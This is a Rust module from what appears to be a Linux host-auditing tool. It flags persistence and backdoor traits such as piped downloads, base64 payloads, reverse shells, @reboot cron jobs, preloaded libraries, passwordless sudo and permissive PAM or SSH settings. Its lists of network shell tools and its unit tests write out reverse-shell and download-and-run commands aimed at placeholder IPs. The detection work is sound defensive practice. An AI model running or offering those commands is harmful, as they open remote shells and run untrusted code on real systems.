//! Traits that look like an attacker's. Each is a lead, not a verdict:
//! administrators download installers and use `nc` too, and attackers can
//! avoid every one of them. Commands are read as words, not parsed as the
//! shell would.

use std::fmt;

use crate::{Detail, Entry, Kind, PamRule, PasswordState};

/// Where files vanish at reboot or that anyone can write to.
const TEMPORARY_DIRECTORIES: [&str; 3] = ["/tmp", "/var/tmp", "/dev/shm"];
const DOWNLOADERS: [&str; 2] = ["curl", "wget"];
const SHELLS: [&str; 9] = [
    "sh", "bash", "dash", "zsh", "ksh", "ash", "mksh", "csh", "tcsh",
];
/// Including Debian's two builds of `nc`.
const NETWORK_RELAYS: [&str; 6] = [
    "nc",
    "nc.traditional",
    "nc.openbsd",
    "ncat",
    "netcat",
    "socat",
];
/// Where bash opens a network connection instead of a file.
const BASH_NETWORK_PATHS: [&str; 2] = ["/dev/tcp/", "/dev/udp/"];
/// Characters that end a word for the shell.
const WORD_BREAKS: [char; 13] = [
    '|', '&', ';', '(', ')', '<', '>', '\'', '"', '`', '$', '{', '}',
];
/// Base64 decoding by function name: Python, PHP, `PowerShell`, Perl.
const DECODING_FUNCTIONS: [&str; 4] = [
    "b64decode",
    "base64_decode",
    "frombase64string",
    "decode_base64",
];

/// Where `sshd` looks for keys unless told otherwise.
const DEFAULT_KEY_FILES: [&str; 4] = [
    ".ssh/authorized_keys",
    ".ssh/authorized_keys2",
    "%h/.ssh/authorized_keys",
    "%h/.ssh/authorized_keys2",
];

/// A suspicious trait.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash)]
pub enum Flag {
    /// The command runs something from, or works in, `/tmp`, `/var/tmp`
    /// or `/dev/shm`: anyone can write there, and `/dev/shm` leaves nothing
    /// on disk.
    TemporaryDirectory,
    /// `curl` or `wget` output fed to a shell (`curl … | sh`,
    /// `bash -c "$(wget …)"`): code fetched and run, never kept.
    DownloadToShell,
    /// Base64 decoding (`base64 -d`, `openssl base64 -d`, `b64decode`):
    /// a payload hidden from a casual read.
    Base64Decoding,
    /// `nc`, `ncat`, `netcat`, `socat`, or bash's `/dev/tcp/` and
    /// `/dev/udp/`: the usual makings of a reverse shell.
    ReverseShell,
    /// A cron job run at every boot (`@reboot`).
    AtReboot,
    /// A key that may only run a forced command (`command="…"`): sometimes
    /// a restricted backup key, sometimes a backdoor run at every login.
    ForcedCommand,
    /// A library in ld.so.preload, loaded into every program: distributions
    /// ship none, rootkits use it to hide.
    Preload,
    /// sudo without a password for every command (`NOPASSWD: ALL`), or
    /// without authentication at all (`Defaults !authenticate`).
    SudoWithoutPassword,
    /// A PAM rule running a program (`pam_exec.so`): at every login, with
    /// the password if `expose_authtok` is set.
    PamExec,
    /// `auth sufficient pam_permit.so`: any password accepted.
    PamAcceptsAnyPassword,
    /// A PAM module given by a path outside the system's module
    /// directories (`/lib/…/security`, `/usr/lib/…/security`).
    PamModuleElsewhere,
    /// `PermitRootLogin yes`: root may log in over SSH with a password.
    RootPasswordLogin,
    /// `PermitEmptyPasswords yes`: accounts without a password may log in
    /// over SSH.
    EmptyPasswords,
    /// Keys `sshd` accepts read from somewhere else than the homes'
    /// `.ssh/authorized_keys` (`AuthorizedKeysFile`), or from a program
    /// (`AuthorizedKeysCommand`).
    KeysElsewhere,
    /// modprobe runs a command instead of loading or unloading a module
    /// (`install`, `remove`), other than `/bin/true` or `/bin/false`, the
    /// usual way to block one.
    ModprobeCommand,
    /// An account with id 0 other than root: root's power under another
    /// name.
    UidZero,
    /// An account without a password (an empty field in `etc/passwd` or
    /// `etc/shadow`): it logs in with none where PAM allows it.
    NoPasswordNeeded,
    /// A system account (id 1 to 999) whose shell lets it log in: a
    /// service account turned into a way in (`www-data` given
    /// `/bin/bash`). Some ship that way (`postgres` on Debian).
    SystemAccountShell,
}

impl Flag {
    /// A short label.
    #[must_use]
    pub const fn label(self) -> &'static str {
        match self {
            Self::TemporaryDirectory => "runs from a temporary directory",
            Self::DownloadToShell => "download piped to a shell",
            Self::Base64Decoding => "base64 decoding",
            Self::ReverseShell => "network shell tool",
            Self::AtReboot => "runs at every boot",
            Self::ForcedCommand => "key with a forced command",
            Self::Preload => "library preloaded into every program",
            Self::SudoWithoutPassword => "sudo without a password",
            Self::PamExec => "PAM runs a program",
            Self::PamAcceptsAnyPassword => "PAM accepts any password",
            Self::PamModuleElsewhere => "PAM module outside the module directories",
            Self::RootPasswordLogin => "root may log in over SSH with a password",
            Self::EmptyPasswords => "SSH logins without a password",
            Self::KeysElsewhere => "SSH keys read from elsewhere",
            Self::ModprobeCommand => "modprobe runs a command",
            Self::UidZero => "id 0 besides root",
            Self::NoPasswordNeeded => "no password needed",
            Self::SystemAccountShell => "system account with a login shell",
        }
    }
}

impl fmt::Display for Flag {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        f.write_str(self.label())
    }
}

/// What looks suspicious about `entry`, in [`Flag`] order.
#[must_use]
pub fn flags(entry: &Entry) -> Vec<Flag> {
    let command = entry.command.as_deref().unwrap_or_default();
    let words: Vec<&str> = words(command).collect();
    [
        (Flag::TemporaryDirectory, in_temporary_directory(command)),
        (Flag::DownloadToShell, downloads_to_shell(command)),
        (Flag::Base64Decoding, decodes_base64(command, &words)),
        (Flag::ReverseShell, uses_network_relay(command, &words)),
        (Flag::AtReboot, runs_at_reboot(entry)),
        (
            Flag::ForcedCommand,
            entry.kind == Kind::AuthorizedKeys && entry.command.is_some(),
        ),
        (Flag::Preload, entry.detail == Detail::PreloadLibrary),
        (
            Flag::SudoWithoutPassword,
            sudo_without_password(&entry.detail),
        ),
        (
            Flag::PamExec,
            pam_rule(entry).is_some_and(|r| r.module_name() == "pam_exec.so"),
        ),
        (
            Flag::PamAcceptsAnyPassword,
            pam_rule(entry).is_some_and(accepts_any_password),
        ),
        (
            Flag::PamModuleElsewhere,
            pam_rule(entry).is_some_and(|r| module_elsewhere(&r.module)),
        ),
        (
            Flag::RootPasswordLogin,
            sshd_setting(entry, "PermitRootLogin").is_some_and(|v| v.eq_ignore_ascii_case("yes")),
        ),
        (
            Flag::EmptyPasswords,
            sshd_setting(entry, "PermitEmptyPasswords")
                .is_some_and(|v| v.eq_ignore_ascii_case("yes")),
        ),
        (Flag::KeysElsewhere, keys_elsewhere(entry)),
        (Flag::ModprobeCommand, modprobe_command(entry)),
        (Flag::UidZero, uid_zero(entry)),
        (Flag::NoPasswordNeeded, no_password_needed(&entry.detail)),
        (
            Flag::SystemAccountShell,
            system_account_shell(&entry.detail),
        ),
    ]
    .into_iter()
    .filter_map(|(flag, found)| found.then_some(flag))
    .collect()
}

/// The command's words, split where the shell would split them.
fn words(command: &str) -> impl Iterator<Item = &str> {
    command
        .split(|c: char| c.is_whitespace() || WORD_BREAKS.contains(&c))
        .filter(|word| !word.is_empty())
}

/// The program a word names: `/usr/bin/curl` is `curl`.
fn program(word: &str) -> &str {
    word.rsplit('/').next().unwrap_or(word)
}

fn in_temporary_directory(command: &str) -> bool {
    TEMPORARY_DIRECTORIES.iter().any(|directory| {
        command.match_indices(directory).any(|(at, _)| {
            let before = command[..at].chars().next_back();
            let after = command[at + directory.len()..].chars().next();
            !before.is_some_and(is_path_character)
                && !after.is_some_and(|c| c != '/' && is_path_character(c))
        })
    })
}

fn is_path_character(c: char) -> bool {
    c.is_alphanumeric() || "._-/~".contains(c)
}

/// `curl … | sh`, or a shell running `$(curl …)`, `` `wget …` `` or
/// `<(curl …)`.
fn downloads_to_shell(command: &str) -> bool {
    let is_downloader = |word: &str| DOWNLOADERS.contains(&program(word));
    let is_shell = |word: &str| SHELLS.contains(&program(word));
    let stages: Vec<&str> = command.split('|').collect();
    let piped = stages
        .iter()
        .position(|stage| words(stage).any(is_downloader))
        .is_some_and(|at| {
            stages[at + 1..].iter().any(|stage| {
                words(stage)
                    .find(|w| !matches!(*w, "sudo" | "env"))
                    .is_some_and(is_shell)
            })
        });
    let substituted = ["$(", "`", "<("].iter().any(|opening| {
        command
            .split(opening)
            .skip(1)
            .any(|inside| words(inside).next().is_some_and(is_downloader))
    }) && words(command).any(is_shell);
    piped || substituted
}

fn decodes_base64(command: &str, words: &[&str]) -> bool {
    let is_decode_switch = |w: &&str| {
        *w == "--decode" || (w.starts_with('-') && !w.starts_with("--") && w.contains(['d', 'D']))
    };
    let base64_tool = words
        .iter()
        .position(|w| program(w) == "base64")
        .is_some_and(|at| words[at + 1..].iter().take(3).any(is_decode_switch));
    let openssl = words.iter().any(|w| program(w) == "openssl")
        && words
            .iter()
            .any(|w| matches!(*w, "base64" | "-base64" | "-a"))
        && words.contains(&"-d");
    let lower = command.to_ascii_lowercase();
    base64_tool || openssl || DECODING_FUNCTIONS.iter().any(|f| lower.contains(f))
}

fn uses_network_relay(command: &str, words: &[&str]) -> bool {
    BASH_NETWORK_PATHS.iter().any(|path| command.contains(path))
        || words
            .iter()
            .any(|word| NETWORK_RELAYS.contains(&program(word)))
}

fn runs_at_reboot(entry: &Entry) -> bool {
    matches!(entry.kind, Kind::Crontab | Kind::SystemCrontab)
        && entry.schedule.as_deref() == Some("@reboot")
}

fn sudo_without_password(detail: &Detail) -> bool {
    match detail {
        Detail::SudoRule(rule) => {
            rule.tags.iter().any(|t| t == "NOPASSWD") && rule.commands.iter().any(|c| c == "ALL")
        }
        Detail::SudoDefaults { settings, .. } => settings
            .split(',')
            .any(|setting| setting.trim() == "!authenticate"),
        _ => false,
    }
}

fn pam_rule(entry: &Entry) -> Option<&PamRule> {
    match &entry.detail {
        Detail::PamRule(rule) => Some(rule),
        _ => None,
    }
}

fn accepts_any_password(rule: &PamRule) -> bool {
    rule.kind() == "auth" && rule.control == "sufficient" && rule.module_name() == "pam_permit.so"
}

/// A path not of the form `/lib/…/security/x.so` or
/// `/usr/lib…/…/security/x.so`.
fn module_elsewhere(module: &str) -> bool {
    let Some((directory, _)) = module.rsplit_once('/') else {
        return false;
    };
    let in_library = ["/lib", "/usr/lib"]
        .iter()
        .any(|root| directory.starts_with(root));
    !(in_library && directory.ends_with("/security"))
}

/// The value of an sshd setting named `key` (any case).
fn sshd_setting<'e>(entry: &'e Entry, key: &str) -> Option<&'e str> {
    match &entry.detail {
        Detail::SshdSetting {
            key: written,
            value,
            ..
        } if written.eq_ignore_ascii_case(key) => Some(value),
        _ => None,
    }
}

fn keys_elsewhere(entry: &Entry) -> bool {
    let files = sshd_setting(entry, "AuthorizedKeysFile").is_some_and(|v| {
        v.split_whitespace()
            .any(|f| !DEFAULT_KEY_FILES.contains(&f))
    });
    let command = sshd_setting(entry, "AuthorizedKeysCommand")
        .is_some_and(|v| !v.eq_ignore_ascii_case("none"));
    files || command
}

fn modprobe_command(entry: &Entry) -> bool {
    let blocks = |command: &str| {
        matches!(
            command.trim(),
            "/bin/true" | "/bin/false" | "/usr/bin/true" | "/usr/bin/false" | "true" | "false"
        )
    };
    entry.kind == Kind::Modprobe && entry.command.as_deref().is_some_and(|c| !blocks(c))
}

fn uid_zero(entry: &Entry) -> bool {
    matches!(&entry.detail, Detail::Account(account) if account.uid == Some(0))
        && entry.user.as_deref() != Some("root")
}

fn no_password_needed(detail: &Detail) -> bool {
    match detail {
        Detail::Account(account) => account.empty_password,
        Detail::Password(password) => password.state == PasswordState::Empty,
        _ => false,
    }
}

fn system_account_shell(detail: &Detail) -> bool {
    matches!(detail, Detail::Account(account)
        if account.uid.is_some_and(|uid| (1..1000).contains(&uid)) && account.can_log_in())
}

#[cfg(test)]
mod tests {
    use super::*;

    fn flags_of(command: &str) -> Vec<Flag> {
        let mut entry = Entry::new(Kind::ShellInit, 1, Detail::ShellCommand);
        entry.command = Some(command.to_owned());
        flags(&entry)
    }

    #[test]
    fn temporary_directories() {
        for command in [
            "/tmp/.x/run",
            "cd /tmp && ./a",
            "sh '/dev/shm/k'",
            "x=/var/tmp/y; $x",
        ] {
            assert_eq!(flags_of(command), [Flag::TemporaryDirectory], "{command}");
        }
        for command in [
            "/home/a/tmp/x",
            "/tmpfiles/x",
            "rm -rf ~/tmp",
            "/usr/bin/tmpwatch",
        ] {
            assert!(flags_of(command).is_empty(), "{command}");
        }
    }

    #[test]
    fn downloads_to_a_shell() {
        for command in [
            "curl -fsSL http://203.0.113.9/i.sh | bash",
            "wget -qO- http://198.51.100.2/x|sudo sh -s",
            "bash -c \"$(curl -s https://example.com/s)\"",
            "sh -c `wget -O - http://192.0.2.1/a`",
            "bash <(curl -s https://example.net/b)",
        ] {
            assert!(
                flags_of(command).contains(&Flag::DownloadToShell),
                "{command}"
            );
        }
        for command in [
            "curl -o /opt/x.tar.gz https://example.com/x.tar.gz",
            "curl https://example.com | grep ok",
            "echo $(date) | sh",
        ] {
            assert!(
                !flags_of(command).contains(&Flag::DownloadToShell),
                "{command}"
            );
        }
    }

    #[test]
    fn base64_and_network_tools() {
        for command in [
            "echo aWQK | base64 -d | sh",
            "base64 --decode < f",
            "openssl base64 -d -in x",
            "python3 -c 'import base64;exec(base64.b64decode(\"aWQ=\"))'",
        ] {
            assert!(
                flags_of(command).contains(&Flag::Base64Decoding),
                "{command}"
            );
        }
        for command in ["base64 -w0 file", "base64 f | tee a b | grep -d skip x"] {
            assert!(
                !flags_of(command).contains(&Flag::Base64Decoding),
                "{command}"
            );
        }
        for command in [
            "bash -i >& /dev/tcp/192.0.2.10/4444 0>&1",
            "nc -e /bin/sh 198.51.100.7 9001",
            "/usr/bin/nc.traditional 192.0.2.3 80",
            "socat exec:'bash -li',pty tcp:203.0.113.5:443",
        ] {
            assert!(flags_of(command).contains(&Flag::ReverseShell), "{command}");
        }
        assert!(!flags_of("ncdu /").contains(&Flag::ReverseShell));
    }
}
